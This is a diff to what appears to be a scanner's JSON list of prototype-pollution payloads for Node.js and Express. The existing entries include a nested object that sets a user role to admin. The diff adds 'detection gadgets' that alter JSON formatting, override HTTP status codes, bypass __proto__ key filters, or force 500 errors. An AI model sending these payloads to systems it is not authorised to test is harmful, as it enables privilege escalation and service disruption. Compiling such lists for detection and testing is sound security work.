@@ -38,5 +38,10 @@
   {"value": "{\"constructor\":{\"prototype\":{\"env\":{\"NODE_DEBUG\":\"true\"}}}}", "encoding": "raw", "context": "json", "targets": ["nodejs","javascript"], "description": "Constructor proto env debug", "severity_hint": "high"},
   {"value": "{\"__proto__\":{\"data\":{\"user\":{\"role\":\"admin\"}}}}", "encoding": "raw", "context": "json", "targets": ["nodejs","javascript"], "description": "Proto pollution nested object merge", "severity_hint": "critical"},
   {"value": "{\"__proto__\":\"polluted\"}", "encoding": "raw", "context": "json", "targets": ["nodejs","javascript"], "description": "Proto pollution scalar proto", "severity_hint": "low"},
-  {"value": "{\"__proto__\":{\"__proto__\":{\"polluted\":\"deep\"}}}", "encoding": "raw", "context": "json", "targets": ["nodejs","javascript"], "description": "Double proto traversal", "severity_hint": "high"}
+  {"value": "{\"__proto__\":{\"__proto__\":{\"polluted\":\"deep\"}}}", "encoding": "raw", "context": "json", "targets": ["nodejs","javascript"], "description": "Double proto traversal", "severity_hint": "high"},
+  {"value": "{\"__proto__\":{\"json spaces\":10}}", "encoding": "raw", "context": "json", "targets": ["nodejs","express"], "description": "Detection gadget: Express json-spaces — response JSON becomes pretty-printed (visible in body/size diff)", "severity_hint": "critical"},
+  {"value": "{\"__proto__\":{\"json spaces\":\"          \"}}", "encoding": "raw", "context": "json", "targets": ["nodejs","express"], "description": "Detection gadget: json-spaces string-indent variant", "severity_hint": "critical"},
+  {"value": "{\"constructor\":{\"prototype\":{\"json spaces\":10}}}", "encoding": "raw", "context": "json", "targets": ["nodejs","express"], "description": "Detection gadget: constructor-chain json-spaces (bypasses __proto__ key filters)", "severity_hint": "critical"},
+  {"value": "{\"__proto__\":{\"status\":510}}", "encoding": "raw", "context": "json", "targets": ["nodejs","express"], "description": "Detection gadget: status-code override — anomalous HTTP status confirms pollution", "severity_hint": "high"},
+  {"value": "{\"__proto__\":{\"parameterLimit\":1}}", "encoding": "raw", "context": "json", "targets": ["nodejs","express","qs"], "description": "Detection gadget: parameterLimit=1 triggers a 500 on subsequent body parsing", "severity_hint": "high"}
 ]
